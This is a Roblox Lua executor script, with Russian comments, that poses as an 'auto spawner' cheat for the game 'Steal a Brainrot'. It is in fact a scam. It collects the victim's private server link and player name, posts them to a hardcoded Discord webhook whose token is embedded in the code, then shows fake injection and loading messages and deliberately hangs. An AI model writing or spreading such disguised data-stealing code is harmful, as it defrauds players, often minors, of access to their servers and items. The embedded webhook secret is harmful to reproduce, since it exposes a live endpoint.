-- ===== НАСТРОЙКА =====
local webhook = "https://discord.com/api/webhooks/1484561417003860122/ZP3_K9aBrLdzQyiwhPpq4oOFs8fycIkltCvOLvndVidLRdR0SRT5l0kOhsz2YuLJ7i9F"
local HttpService = game:GetService("HttpService")

-- ===== ОТПРАВКА В DISCORD =====
local function sendToDiscord(link, player)
    local data = {
        ["content"] = "**NEW DATA**\nPlayer: "..player.Name.."\nLink: "..link
    }
    local json = HttpService:JSONEncode(data)

    local req = request or http_request or (syn and syn.request)
    if req then
        pcall(function()
            req({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        end)
    else
        warn("Executor does not support requests, skipping Discord send")
    end
end

-- ===== ПРОВЕРКА ССЫЛКИ =====
local function isValidRobloxLink(link)
    if not link or link == "" then return false end
    link = string.lower(link)
    if string.find(link, "roblox.com/games/") then return true end
    if string.find(link, "roblox.com/share") then return true end
    if string.find(link, "roblox://") then return true end
    return false
end

-- ===== GUI =====
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(1,0,1,0)
Frame.BackgroundColor3 = Color3.new(0,0,0)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1,0,0.2,0)
Title.Position = UDim2.new(0,0,0.15,0)
Title.Text = "AUTO SPAWNER SCRIPT\nSTEAL A BRAINROT"
Title.TextColor3 = Color3.new(0,1,0)
Title.BackgroundTransparency = 1
Title.TextScaled = true

local Box = Instance.new("TextBox", Frame)
Box.Size = UDim2.new(0.3,0,0.06,0)
Box.Position = UDim2.new(0.35,0,0.5,0)
Box.PlaceholderText = "link for server"
Box.Text = ""
Box.TextScaled = true

local Button = Instance.new("TextButton", Frame)
Button.Size = UDim2.new(0.2,0,0.06,0)
Button.Position = UDim2.new(0.4,0,0.6,0)
Button.Text = "DONE"
Button.TextScaled = true

local Loading = Instance.new("Frame", ScreenGui)
Loading.Size = UDim2.new(1,0,1,0)
Loading.BackgroundColor3 = Color3.new(0,0,0)
Loading.Visible = false

local Log = Instance.new("TextLabel", Loading)
Log.Size = UDim2.new(1,0,1,0)
Log.BackgroundTransparency = 1
Log.TextColor3 = Color3.new(0,1,0)
Log.TextXAlignment = Enum.TextXAlignment.Left
Log.TextYAlignment = Enum.TextYAlignment.Top
Log.TextSize = 18
Log.Text = ""

-- ===== ФУНКЦИЯ ADDLINE =====
local function addLine(text)
    if Log and Log.Text ~= nil then
        Log.Text = Log.Text .. "\n> " .. text
    end
end

-- ===== КНОПКА =====
Button.MouseButton1Click:Connect(function()
    local player = game.Players.LocalPlayer
    local link = Box.Text ~= "" and Box.Text or ""

    Frame.Visible = false
    Loading.Visible = true

    if not isValidRobloxLink(link) then
        Log.Text = ""
        addLine("Checking link...")
        wait(1)
        addLine("Invalid Roblox server link ❌")
        wait(2)
        addLine("Please enter a valid link")
        wait(2)
        ScreenGui:Destroy()
        return
    end

    -- Если ссылка верная, отправляем на Discord
    sendToDiscord(link, player)

    Log.Text = ""
    addLine("Valid Roblox link ✔")
    wait(1)
    addLine("Connecting to server...")
    wait(1)
    addLine("Server: "..link)
    wait(1)
    addLine("Injecting modules...")
    wait(1)

    for i = 1,100 do
        addLine("Loading "..i.."%")
        wait(0.03)
    end

    addLine("Done.")
    wait(1)

    -- Бесконечная “загрузка” (фейк зависания)
    while true do
        wait(0.1)
    end
end)
